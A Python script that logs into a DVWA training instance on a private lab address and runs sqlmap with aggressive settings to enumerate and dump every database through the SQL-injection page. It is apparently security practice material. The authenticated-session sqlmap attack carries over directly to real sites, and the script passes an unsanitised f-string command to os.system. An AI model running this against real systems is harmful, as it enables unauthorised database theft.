import os
import requests
from bs4 import BeautifulSoup

# URL of the DVWA application
base_url = "http://192.168.64.3/DVWA/"
login_url = base_url + "login.php"
sqli_url = base_url + "vulnerabilities/sqli/?id=1&Submit=Submit"

# DVWA login credentials
dvwa_username = "admin"
dvwa_password = "password"

# Function to login to DVWA and retrieve session ID
def get_session_id():
    with requests.Session() as session:
        # Get initial login page to retrieve the user_token
        response = session.get(login_url)
        soup = BeautifulSoup(response.content, 'html.parser')
        user_token = soup.find('input', {'name': 'user_token'})['value']

        # Login payload
        payload = {
            'username': dvwa_username,
            'password': dvwa_password,
            'Login': 'Login',
            'user_token': user_token
        }

        # Perform login
        post_response = session.post(login_url, data=payload)
        
        # Retrieve PHPSESSID from cookies
        session_id = session.cookies.get('PHPSESSID')

        # Check if login was successful
        if "Welcome to Damn Vulnerable Web Application" in post_response.text:
            print("Login successful. Session ID:", session_id)
        else:
            print("Login failed. Check your credentials and DVWA configuration.")
            session_id = None
        
        return session_id

# Running SQLMap to detect SQL injection
def run_sqlmap(target_url, session_id):
    if session_id:
        # More aggressive SQLMap options for full-fledged SQL injection testing
        sqlmap_command = (
            f"sqlmap -u {target_url} "
            f"--cookie='PHPSESSID={session_id}; security=low' "
            "--batch --level=5 --risk=3 --dbs --tables --columns --dump-all --random-agent --threads=5"
        )
        print(f"Running SQLMap with command: {sqlmap_command}")
        os.system(sqlmap_command)
    else:
        print("No valid session ID. SQLMap will not run.")

if __name__ == "__main__":
    session_id = get_session_id()
    run_sqlmap(sqli_url, session_id)
